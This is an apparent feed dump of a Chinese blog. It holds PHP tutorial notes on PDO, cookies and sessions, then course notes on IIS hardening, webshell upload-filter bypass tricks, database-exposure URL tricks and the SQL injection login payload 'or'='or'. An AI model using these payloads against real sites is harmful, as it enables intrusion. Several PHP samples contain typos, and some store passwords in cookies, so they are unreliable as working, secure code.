<p>第一个参数fetch_style是必选项，以何种方式引用所获取的列取决于该参数。默认值为PDO::FETCH_BOTH，还可以指定PDO::FETCH_COLUMN值，从结果集中返回一个包含单列的所有值。<br>第二个参数column_index是可选项，需要提供一个整数索引，当在fetchAll()方法的第一个参数中指定PDO::FETCH_COLUMN值时，从结果集中返回通过该参数提供的索引所指定列的所有值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	try&#123;</span><br><span class="line">		$dbh=new PDO(&apos;mysql:dbname=testdb;host=localhost&apos;,&apos;mysql_user&apos;,&apos;mysql_pwd&apos;);</span><br><span class="line">	&#125;catch(PDOException $e)&#123;</span><br><span class="line">		echo &apos;数据库连接失败：&apos;.$e-&gt;getMessage();</span><br><span class="line">		exit;</span><br><span class="line">	&#125;</span><br><span class="line">	echo &apos;&lt;table border=&quot;1&quot; align=&quot;center&quot; width=90%&gt;&apos;;</span><br><span class="line">	echo &apos;&lt;caption&gt;&lt;h1&gt;联系人信息表&lt;/h1&gt;&lt;/caption&gt;&apos;;</span><br><span class="line">	echo &apos;&lt;tr bgcolor=&quot;#cccccc&quot;&gt;&apos;;</span><br><span class="line">	echo &apos;&lt;th&gt;UID&lt;/th&gt;&lt;th&gt;姓名&lt;/th&gt;&lt;th&gt;联系地址&lt;/th&gt;&lt;th&gt;联系电话&lt;/th&gt;&lt;th&gt;电子邮件&lt;/th&gt;&lt;/tr&gt;&apos;;	$stmt=$dbh-&gt;prepare(&quot;select uid,name,address,phone,email from contactInfo&quot;);</span><br><span class="line">	$stmt-&gt;execute();</span><br><span class="line">	$allRows=$stmt-&gt;fetchAll(PDO::FETCH_NUM);</span><br><span class="line">	foreach($allRows as $row)&#123;</span><br><span class="line">		echo &apos;&lt;tr&gt;&apos;;</span><br><span class="line">		echo &apos;&lt;td&gt;&apos;.$row[0].&apos;&lt;/td&gt;&apos;;</span><br><span class="line">		echo &apos;&lt;td&gt;&apos;.$row[1].&apos;&lt;/td&gt;&apos;;</span><br><span class="line">		echo &apos;&lt;td&gt;&apos;.$row[2].&apos;&lt;/td&gt;&apos;;</span><br><span class="line">		echo &apos;&lt;td&gt;&apos;.$row[3].&apos;&lt;/td&gt;&apos;;</span><br><span class="line">		echo &apos;&lt;td&gt;&apos;.$row[4].&apos;&lt;/td&gt;&apos;;</span><br><span class="line">		echo &apos;&lt;/tr&gt;&apos;;</span><br><span class="line">	&#125;</span><br><span class="line">	echo &apos;&lt;/table&gt;&apos;;</span><br><span class="line"></span><br><span class="line">	$stmt-&gt;execute();</span><br><span class="line">	$row=$stmt-&gt;fetchAll(PDO::FETCH_COLUMN, 1);</span><br><span class="line">	echo &apos;所有联系人的姓名：&apos;;</span><br><span class="line">	print_r($row);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h4><span id="bindcolumn方法">bindColumn()方法</span></h4><p>使用该方法可以将一个列和一个指定的变量名绑定，这样在每次使用fetch()方法获取各行记录时，会自动将相应的列值赋给该变量，但必须是在fetch()方法第一个参数设置为PDO：：FETCH_BOTH值时。bindColumn()方法的原型如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bindColumn(mixed coumn,mixed&amp;param[,int type])		//设置绑定列值到变量上</span><br></pre></td></tr></table></figure></p>
<p>第一个参数column为必选项，可以使用整数的列偏移位置索引（索引值从1开始），或是列的名称字符串。第二个参数param也是必选项，需要传递一个引用，所以必须提供一个相应的变量名。第三个参数type是可选项，通过设置变量的类型来限制变量值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	try&#123;</span><br><span class="line">		$dbh=new PDO(&apos;mysql:dbname=testdb;host=localhost&apos;,&apos;mysql_user&apos;,&apos;mysql_pwd&apos;);</span><br><span class="line">		$dbh-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);</span><br><span class="line">	&#125;catch(PDOException $e)&#123;</span><br><span class="line">		echo &apos;数据库连接失败：&apos;.$e-&gt;getMessage();</span><br><span class="line">		exit;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$query=&quot;SELECT uid, name, phone, email FROM contactInfo WHERE departmentId=&apos;D01&apos;&quot;;</span><br><span class="line">	try &#123;</span><br><span class="line">		$stmt=$dbh-&gt;prepare($query);</span><br><span class="line">		$stmt-&gt;execute();</span><br><span class="line">		$stmt-&gt;bindColumn(1, $uid);</span><br><span class="line">		$stmt-&gt;bindColumn(2, $name);</span><br><span class="line">		$stmt-&gt;bindColumn(&apos;phone&apos;, $phone);</span><br><span class="line">		$stmt-&gt;bindColumn(&apos;email&apos;, $email);</span><br><span class="line"></span><br><span class="line">		while ($row = $stmt-&gt;fetch(PDO::FETCH_BOUND)) &#123;</span><br><span class="line">			 echo $uid.&quot;\t&quot;.$name.&quot;\t&quot;.$phone.&quot;\t&quot;.$email.&quot;\n&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; catch (PDOException $e) &#123;</span><br><span class="line">		echo $e-&gt;getMessage();</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h4><span id="大数据对象的存取">大数据对象的存取</span></h4><p>PDO允许在bindParam()或bindColumn()调用中通过使用PDO::PARAM_LOB类型代码来使用大型数据库类型。PDO::PARAM_LOB告诉PDO将数据映射为流，所以可以使用PHP中文件处理函数来操纵这样的数据。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$dbh=new PDO(&apos;mysql:dbname=testdb;host=localhost&apos;,&apos;mysql_user&apos;,&apos;mysql_pwd&apos;);		//连接数据库</span><br><span class="line">	$stmt=$dbh-&gt;prepare(&quot;inset into images(contenttype,imagedata)values(?,?)&quot;);			//准备插入查询</span><br><span class="line">	$fp=fopen($_FILES[&apos;file&apos;][&apos;tmp_name&apos;],&apos;rb&apos;);			//使用fopen()函数打开上传的文件</span><br><span class="line">	$stmt-&gt;bindParam(1,$_FILES[&apos;flie&apos;][&apos;type&apos;]);			//将上传的MIME类型绑定到第一个参数中</span><br><span class="line">	$stmt-&gt;bindParam(2,$fp,PDO_PARAM_LOB);			//将上传文件的二进制数据和第二个参数绑定</span><br><span class="line">	$stmt-&gt;execute();			//执行准备好的并绑定了参数的查询</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h1><span id="会话控制">会话控制</span></h1><h2><span id="cookie的应用">Cookie的应用</span></h2><h3><span id="cookie概述">Cookie概述</span></h3><p>Cookie是用来将使用者资料记录在客户端的技术，这种技术让Web服务器能将一些只需存放于客户端，或者可以在客户端进行运算的资料，存放于用户的电脑系统之中。</p>
<h3><span id="向客户端电脑中设置cookie">向客户端电脑中设置Cookie</span></h3><p>使用PHP内建的setCookie()函数来新建立一个Cookie。Cookie是HTTP标头的一部分，因此setCookie()函数必须在其他信息被输出到浏览器前调用，所以即使是空格或空行都不要在调用setCookie()函数之前输出。setCookie()函数的语法格式如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool setcookie(string $name[,string $value[,int $expire[,string $path[,string $domain[,bool $secure]]]]])</span><br></pre></td></tr></table></figure></p>
<p>setcookie()函数定义一个和其余的HTTP标头一起发送的Cookie，它的所有参数是对应HTTP标头Cookie资料的属性。</p>
<table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:left">描述</th>
<th style="text-align:left">示例</th>
</tr>
</thead>
<tbody>
<tr>
<td>$name</td>
<td style="text-align:left">Cookie的识别名称</td>
<td style="text-align:left">使用$_COOKIE[‘cookiename’]调用名为cookiename的Cookie</td>
</tr>
<tr>
<td>$value</td>
<td style="text-align:left">Cookie的值，可以为数值或字符串形态，此值保存在客户端，不要用来保存敏感数据</td>
<td style="text-align:left">假定第一个参数为‘cookiename’，可以通过$_COOKIE[‘cookiename’]取得其值</td>
</tr>
<tr>
<td>$expire</td>
<td style="text-align:left">Cookie的生成期限，这是个Unix时间戳，即从Unix纪元开始的秒数</td>
<td style="text-align:left">如time()+60<em>60</em>24*7将设定Cookie在一周后失效，如果未设定cookie,则会在会话结束后就立即失效</td>
</tr>
<tr>
<td>$panth</td>
<td style="text-align:left">Cookie在服务器端的指定路径，当设定此值时，服务器中只有指定路径下的网页或程序可以存取此Cookie</td>
<td style="text-align:left">如果该参数设为“/”的话，cookie就在整个domain内有效，如果设为‘/foo’,cookie就只在domain下的/foo/目录及其子目录内有效，默认值为设定cookie的当前目录</td>
</tr>
<tr>
<td>$domain</td>
<td style="text-align:left">指定此Cookie所属服务器的网址名称，预设是建立此Cookie服务器的网址</td>
<td style="text-align:left">要使cookie能在如example.com域名下所有子域名都有效的话，该参数应该设为“.example.com”。虽然“.”并不是必须的，但加上它会兼容更多浏览。如果该参数设置为www.example.com的话，就只在www子域内有效</td>
</tr>
<tr>
<td>$secure</td>
<td style="text-align:left">指明Cookie是否仅通过安全的HTTPS连接传送中Cookie的安全识别常数，如果设定此值代表只有在某种情况下，才能在客户端与服务器之间传递</td>
<td style="text-align:left">当设成TRUE时，Cookie仅在安全的连接中被设置。默认值为FALSE</td>
</tr>
</tbody>
</table>
<p>如果只有name这一个参数，则原有此名称的Cookie选项将会被删除，可以使用空字符串（“ ”）来略过此参数。参数expire和secure是个整数，可以使用0来略过参数，而不是使用空字符串。但参数expire是一个正规的Unix时间整数，由time()或mktime()函数传回。参数secure指出此Cookie将只有在安全的HTTPS连接时传送。在实际建立Cookie是通常仅使用前三项参数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	setcookie(&quot;username&quot;,&quot;test&quot;,time()+60*60*24*7);			//向客户端发送一个Cookie</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>全部参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	setcookie(&quot;username&quot;,&quot;test&quot;,time()+60*60*24*7，&quot;/test&quot;,&quot;.example.com&quot;,1);			//使用全部参数设置</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h3><span id="在php脚本中读取cookie的资料内容">在PHP脚本中读取Cookie的资料内容</span></h3><p>在设置Cookie的脚本中，第一次读取它的信息并不会生效，必须刷新或到下一个页面才可以看到Cookie值，因为Cookie要先被设置到客户端，再次访问时才能被发送回来，这时才能被获取。所以要测试一个Cookie是否被成功的设定，可以在其到期之前通过另一个页面来访问其值。可以简单地使用print_r(_COOKIE)指令来调试现有的Cookies。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	print_r($_COOKIE);			//输出Cookie中保存的所有用户信息</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h3><span id="数组形态的cookie应用">数组形态的Cookie应用</span></h3><p>Cookie也可以利用多维数组的形式，将多个内容值存储在相同Cookie名称标识符下。但不能直接使用setCookie()函数，将数组变量插入到第二个参数作为Cookie的值，因为setCookie()函数的第二个参数必须传一个字符串的值。如果需要将数组变量设置到Cookie中，可以在setCookie()函数的第二个参数中，通过在Cookie标识名称中指定数组下标的形式设置。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	setcookie(&quot;user[username]&quot;,&quot;username&quot;);				//设置为$_COOKIE[&quot;user&quot;][&quot;username&quot;]</span><br><span class="line">	setcookie(&quot;user[password]&quot;,&quot;md5(&quot;123456&quot;)&quot;);		//设置为$_COOKIE[&quot;user&quot;][&quot;password&quot;]</span><br><span class="line">	setcookie(&quot;user[email]&quot;,&quot;test@example.com&quot;);		//设置为$_COOKIE[&quot;user&quot;][&quot;email&quot;]</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>用forecho()函数遍历Cookie<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	forecho($_COOKIE[&quot;user&quot;]as $key=&gt;$value)&#123;</span><br><span class="line">		echo $key.&quot;:&quot;.$value.&quot;\n&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h3><span id="删除cookie">删除Cookie</span></h3><p>删除保存在客户端的Cookie，可以使用两种方法。第一种方法，省略setcookie()函数所有参数列，仅导入第一个参数cookie识别名称参数，来删除指定名称的Cookie资料；第二种方式，利用setcookie()函数，把目标Cookie设定为“已过期”状态。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	//只指定Cookie识别名称一个参数，即删除客户端中这个指定名称的Cookie资料</span><br><span class="line">	setCookie(&quot;Account&quot;);		//第一种方法</span><br><span class="line">	//设置Cookie在当前时间之前已经过期，因此系统会自动删除识别名称isLogin的Cookie</span><br><span class="line">	setCookie(&quot;isLogin&quot;,&quot;&quot;,time()-1);		//第二种方法</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h2><span id="session的应用">Session的应用</span></h2><h3><span id="session">Session</span></h3><p>Session技术是将使用者相关的资料存放在服务器的系统之下，所以使用者无法停止Session的使用。<br>在客户端仅需要保存由服务器为用户创建的一个Session标识符，称为Session ID;而在服务器端保存Session变量的值。Session ID是一个既不会重复，又不容易被找到规律的，由32位十六进制数组成的字符串。Session ID会保存在客户端的Cookie里，如果用户阻止Cookie的使用，则可以将Session ID保存在用户浏览器地址栏的URL中。当用户请求Web服务器时，就会把Session ID发送给服务器，再通过Session ID提取保存在服务器中的Seesion变量。可以把Session中保存的变量，当做是这个用户的全局变量，同一个用户对每个脚本的访问都共享这些变量。<br>当某个用户向Web服务器发出请求时，服务器首先会检查这个客户端的请求里是否已经包含了一个Session ID。如果包含，说明之前已经为此用户创建过Session，服务器则按该Session ID把Session检索出来使用。如果客户端请求不包含Session ID，则为该用户创建一个Session，并且生成一个与此Session关联的Session ID,在本次响应中被传送给客户端保存。<br>Session是存放与服务器之中，为了避免对服务器系统造成过大的负荷，因此Session并不像Cookie是一种半永久性的存在。Session会因为下面两种状况而自然消失。</p>
<ul>
<li>第一个状况，当使用者关闭浏览器，失去与服务器之间的连接之后，Session即会自动消失。而当使用者下次登入网址时，再另行配置一个Session使用。</li>
<li>第二种状况，Session指定的有效期限到期。一般而言PHP系统中对于Session的生存时间并无定义，也就是说预设值为零。可以通过修改php.ini配置文件中有关“session.cookie.lift_time”项目，来设定Session的有效期限，以秒为单位指定了发送给浏览器的Cookie的生命周期。值为0表示“直到关闭浏览器”，默认为0.当系统赋予Session有效期限后，不管浏览器是否开启，Session都会自动消失。</li>
</ul>
<h3><span id="配置session">配置Session</span></h3><table>
<thead>
<tr>
<th>选项名</th>
<th style="text-align:left">描述</th>
<th style="text-align:left">默认值</th>
</tr>
</thead>
<tbody>
<tr>
<td>session.auto_start</td>
<td style="text-align:left">自动启动会话，0标识禁用，1表示开启</td>
<td style="text-align:left">0</td>
</tr>
<tr>
<td>session.cache_expire</td>
<td style="text-align:left">为缓存中的会话页设置当前时间，单位分钟</td>
<td style="text-align:left">180</td>
</tr>
<tr>
<td>session.cookie_domain</td>
<td style="text-align:left">指定会话Cookie中的域</td>
<td style="text-align:left">none</td>
</tr>
<tr>
<td>session.cookie_lifetime</td>
<td style="text-align:left">Cookie中的Session ID在客户机上保存的时间，0标识延续到浏览器关闭时</td>
<td style="text-align:left">0</td>
</tr>
<tr>
<td>session.cookie_path</td>
<td style="text-align:left">在会话Cookie中要设置的路径</td>
<td style="text-align:left">/</td>
</tr>
<tr>
<td>seesion.name</td>
<td style="text-align:left">会话的名称，在客户端用做Cookie的标识名称</td>
<td style="text-align:left">PHPSESSID</td>
</tr>
<tr>
<td>session.save_path</td>
<td style="text-align:left">会话在服务器存储的路径</td>
<td style="text-align:left">/tmp</td>
</tr>
<tr>
<td>seesion.use_cookies</td>
<td style="text-align:left">配置在客户端使用Cookie的会话，1表示允许</td>
<td style="text-align:left">1</td>
</tr>
</tbody>
</table>
<h3><span id="session的声明与使用">Session的声明与使用</span></h3><p>Session的设置不同于Cookie，必须先启动，在PHP中必须调用session_start()函数，以便让PHP核心程序，将和Session相关的内建环境变量预先载入至内存中。seesion_star()函数的语法格式如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool session_start(void)		//创建Session,开始一个会话，进行Session初始化</span><br></pre></td></tr></table></figure></p>
<p>函数Session_start()有两个作用，一是开始一个会话，二是返回已经存在的会话。这个函数没有参数，且返回值均为TRUE。</p>
<h3><span id="注册一个会话变量和读取session">注册一个会话变量和读取Session</span></h3><p>注册和读取Session变量，都要通过访问$_SESSION数组完成。在$_SESSION关联数组中农工的键名具有和PHP中普通变量名相同的命名规则。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	session_start();			//启动Session的初始化</span><br><span class="line">	$_SESSION[&quot;username&quot;]=&quot;admin&quot;;			//注册Session变量，赋值为一个用户的名称</span><br><span class="line">	$_SESSION[&quot;password&quot;]=&quot;123456&quot;;			//注册Session变量，赋值为一个用户的密码</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>Seesion变量的文件的内容结构：</p>
<pre><code>变量名|类型:长度:值;        //每个变量都使用相同的结构保存
</code></pre><h3><span id="注销变量与销毁session">注销变量与销毁Session</span></h3><p>销毁和当前Session有关的所以资料，可以调用session_destroy()函数结束当前的会话，并清空会话中的所有资源。该函数的语法格式如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool session_destroy(void)		//销毁和当前Session有关的所有资料</span><br></pre></td></tr></table></figure></p>
<p>该函数用来关闭Session的运作，如果成功则传回TRUE，销毁Session资料失败则返回false.但该函数并不会释放和当前的Session相关的变量，也不会删除保存在客户端Cookie中的Session ID.因为$_SESSION数组和自定义的数组在使用上是相同的，所以我们可以使用unset()函数释放在Session中注册的单个变量。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unset($_SESSION[&quot;username&quot;]);		//删除在Sesssion中注册的用户名变量</span><br><span class="line">unset($_SESSION[&quot;password&quot;]);		//删除在Session中注册的用户密码变量</span><br></pre></td></tr></table></figure></p>
<p>不要使用unset($_SESSION)删除整个$_SESSION数组，这样将不能再通过$_SESSION超全局数组注册变量了。但如果想把某个用户在Session中注册的所有变量都删除，可以直接将数组变量$_SESSION赋上一个空数组。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION=array();			//将某个用户在Session中注册的变量全部清除</span><br></pre></td></tr></table></figure></p>
<p>在PHP脚本中，可以通过调用session_name()函数获取Session名称。删除保存在客户端Cookie中的Session ID.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	if(isset($_COOKIE[session_name()]))&#123;			//判断Cookie中是否保存Session ID</span><br><span class="line">			setcookie(session_name(),&quot;&quot;,time()-3600,&quot;/&quot;);		//删除包含Session ID的Cookie</span><br><span class="line">			&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>Session的注销过程共需要四个步骤。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    	 //第一步：开启Session并初使化</span><br><span class="line">	session_start();       </span><br><span class="line">     	//第二步：删除所有Session的变量，也可用unset($_SESSION[xxx])逐个删除</span><br><span class="line">	$_SESSION = array();   </span><br><span class="line">	//第三步：如果使用基于Cookie的Session，使用setCooike()删除包含Session Id的Cookie</span><br><span class="line">	if (isset($_COOKIE[session_name()])) &#123;</span><br><span class="line">   		setcookie(session_name(), &apos;&apos;, time()-42000, &apos;/&apos;);</span><br><span class="line">	&#125;</span><br><span class="line">	//第四步：最后彻底销毁Session</span><br><span class="line">	session_destroy();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h3><span id="传递session-id">传递Session ID</span></h3><p>使用Session跟踪一个用户，是通过在各个方面之间传递唯一的Session ID，并通过Session ID提取这个用户在服务器中保存的Session。常见的Session ID传送方法有以下两种。</p>
<ul>
<li>第一种方法是基于Cookie的方式传递Session ID，这种方法更优化，但由于不总是可用，因为用户在客户端可以屏蔽Cookie。</li>
<li>第二种方法则是通过URL参数进行传递，直接将会话ID嵌入到URL中。</li>
</ul>
<h4><span id="通过cookie传递session-id">通过Cookie传递Session ID</span></h4><p>如果客户端没有禁用Cookie，则在PHP脚本中通过session_start()函数进行初始化后，服务器会自动发送HTTP标头将Session ID保存到客户端电脑的Cookie中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setCookie(session_name(),session_id(),0,&apos;/&apos;)			//虚拟向Cookie中设置Session ID的过程</span><br></pre></td></tr></table></figure></p>
<ul>
<li>在第一个参数中调用session_name()函数，返回当前Session的名称做为Cookie的标识名称。Session名称的默认值为PHPSESSID，是在php.ini文件中由session.name选项指定的值。也可以调用session_name()函数时提供参数改变当前Session名称。</li>
<li>在第二个参数中调用session_id()函数，返回当前Session ID作为Cookie的值。也可以通过调用session_id()函数时提供参数设定当前Session ID</li>
<li>第三个参数的值0，是通过在php.ini文件中由session.cookie_lifetime选项设置的值。默认值为0，表示Session ID将在客户机的Cookie中延续到浏览器关闭</li>
<li>最后一个参数“/”，表示在Cookie中要设置的路径在整个域内都有效</li>
</ul>
<h4><span id="通过url传递session-id">通过URL传递Session ID</span></h4><p>PHP可以重写客户请求的URL，把SessionID添加到URL信息中。可以手动地在每个超链接的URL中都添加一个SessionID,但工作量比较大，不建议使用这种方式。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	session_start();</span><br><span class="line">	echo&apos;&lt;a href=&quot;demo.php?&apos;.session_name().&apos;=&apos;.session_id().&apos;&quot;&gt;链接演示&lt;/a&gt;;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[安全牛：网络渗透与深度防御视频-整理笔记]]></title>
      <url>https://uknowsec.cn/posts/notes/%E5%AE%89%E5%85%A8%E7%89%9B%EF%BC%9A%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E4%B8%8E%E6%B7%B1%E5%BA%A6%E9%98%B2%E5%BE%A1%E6%95%B4%E7%90%86%E7%AC%94%E8%AE%B0.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="web加固">Web加固</span></h2><h3><span id="iis加固">IIS加固</span></h3><ul>
<li>日志:更改默认日志的路径.记录:cookies 协议版本</li>
<li>权限:只读,脚本资源访问<br>主目录</li>
<li>删除所有不需要的脚本扩展名:主目录:asp </li>
<li>向客户端发送以下消息:处理URL出错:<br>主目录–配置–调试</li>
<li>限定访问后台的IP:目录安全性</li>
<li>删除所有自定义错误:防止被挂马</li>
</ul>
<h3><span id="防止数据下载">防止数据下载</span></h3><ul>
<li>修改数据库名,和默认路径</li>
<li>数据库重定向到主页</li>
<li>防暴库：conn.asp:on error resume next</li>
</ul>
<h3><span id="ntfs小到大">NTFS:小到大</span></h3><ul>
<li>删除所有权限。</li>
<li>给administrator完全控制权限</li>
<li>给IIS_WPG  完全控制</li>
<li>给IUSR_HOSTNAME 只读</li>
</ul>
<h3><span id="终级防网马webshell">终级防网马:webshell</span></h3><p> 能写不能执行,能执行不能写入</p>
<ul>
<li>哪些目录需要写入权限:data uploadfile uploadface<br>databackup—&gt;iusr_heixia</li>
<li>在IIS中给以下目录拒绝执行权限</li>
</ul>
<h2><span id="常用攻击方法">常用攻击方法</span></h2><h3><span id="爆库">爆库</span></h3><p>  #：%23<br>  %：%25<br>  空格：%20<br>  www.xx.com/bbs/a.asp?id=1<br>  ‘<br>  id=a<br>   id=999999<br>   第二个/替换为%5c<br>   id[]=1<br>   apsx:~a.asp<br>   jsp:%81,原代码，<br>  .JSP<br>  .js%2527<br>  www.xx.com/abc.asp加不存在页面</p>
<p>  数据库密码技巧<br>  Log日志文件  登录日志</p>
<h3><span id="上传webshell">上传webshell</span></h3><ul>
<li><p>无任何限制：<br>　　直接上传</p>
</li>
<li><p>限制后缀：黑名单 asp,asax<br>　　突破：a.cer,a.cdx</p>
</li>
<li><p>后缀替换为空：<br>a.aaspsp<br>　a.asaspp</p>
</li>
<li><p>mine.types:<br>　a.php.rar.rar.rar</p>
</li>
<li><p>a.asp. a#2easp</p>
</li>
<li><p>windows2003解析漏洞：<br>建立文件夹：a.asp<br>里面放任何文件都会解析为.asp</p>
</li>
<li><p>文件改名为：a.asp;.jpg</p>
<p>8.本地验证：<br>前台上传webshell  记录webshell路径<br>后台数据库备份修改后缀</p>
</li>
</ul>
<h2><span id="手工注入access">手工注入Access</span></h2><h3><span id="注入成因">注入成因</span></h3><p>程序对用户输入的字符没有进行过滤</p>
<h3><span id="后台登录">后台登录</span></h3><p>万能密码（参数查询不适用）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;or&apos;=&apos;or&apos;</span><br></pre></td></tr></table></figure>
<p>原因分析</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">登录语句：</span><br><span class="line">select * from admin where username =&apos;$username&apos; and password=&apos;$password&apos;</span><br><span class="line"></span><br><span class="line">插入 &apos;or&apos;=&apos;or&apos;,语句变为：</span><br><span class="line">select * from admin where username =&apos;&apos;or&apos;=&apos;or&apos;&apos; and password=&apos;$password&apos;</span><br><span class="line"></span><br><span class="line">or 前面的单引号用于闭合原语句的单引号，此时username等于空，此时&apos;=&apos;判断为true，</span><br><span class="line">再与username或判断为true，第二个or后的单引号用于闭合。</span><br></pre></td></tr></table></figure>
<h3><span id="判断注入点">判断注入点</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www.xx.com/a.asp?id=1</span><br><span class="line">and 1=1 返回正常</span><br><span class="line">and 1=2 返回错误</span><br></pre></td></tr></table></figure>
